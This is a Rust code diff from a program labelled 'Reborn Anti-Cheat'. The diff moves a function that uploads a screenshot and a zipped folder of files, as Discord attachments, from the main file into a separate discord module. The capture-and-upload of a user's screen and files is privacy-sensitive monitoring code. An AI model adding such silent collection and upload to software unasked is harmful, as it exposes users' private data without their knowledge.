@@ -1,6 +1,6 @@
 use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};
 use super::{
-    http, global
+    discord, global
 };
 
 // Define global variables
@@ -50,61 +50,13 @@ fn main(token: &str) {
     // Send the files to discord
     let image_data: String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
     let zip_data: String = format!("data:application/zip;base64,{}", base64::encode(&std::fs::read(ZIP_PATH.to_string() + ".zip").expect("failed to read zip file")).to_string());
-    send_files_to_discord(token, &image_data, &zip_data);
-    
+    discord::send_files(token, &image_data, &zip_data);
+
 }
 
 // Create a new folder with the current time as it's name
 fn create_new_folder(name: &str) {
     std::fs::create_dir(name).expect("failed to create folder");
-}
-
-// The send_discord_request function is used to send a request
-// to our discord api to send a message to a discord channel.
-fn send_files_to_discord(token: &str, image_data: &str, zip_data: &str) {
-    // Get the bearer token
-    let bearer: String = match global::get_bearer() {
-        Ok(b) => b,
-        Err(e) => panic!("Error: {}", e)
-    };
-
-    // Get the access token
-    let access_token: String = global::generate_access_token(&bearer);
-
-    // Get the current timestamp
-    let timestamp: chrono::DateTime<chrono::Utc> = std::time::SystemTime::now().into();
-
-    // Build the http request
-    let resp = http::CLIENT
-        .put(format!("http://localhost:8080/message/{token}"))
-        .header("authorization", &bearer)
-        .header("access_token", access_token)
-        .json(&serde_json::json!({
-            // Attachments
-            "attachments": vec![
-                serde_json::json!({
-                    "name": "screenshot.png",
-                    "url": image_data
-                }),
-                serde_json::json!({
-                    "name": "files.zip",
-                    "url": zip_data
-                })
-            ],
-
-            // Embeds
-            "embeds": vec![
-                serde_json::json!({
-                    "title": "Reborn Anti-Cheat",
-                    "color": 0x00ff00,
-                    "timestamp": timestamp.to_rfc3339(),
-                    "thumbnail": {
-                        "url": "attachment://screenshot.png"
-                    },
-                })
-            ]
-        }))
-        .send().expect("failed to send discord request");
 }
 
 // Take a screenshot and save it to the current folder
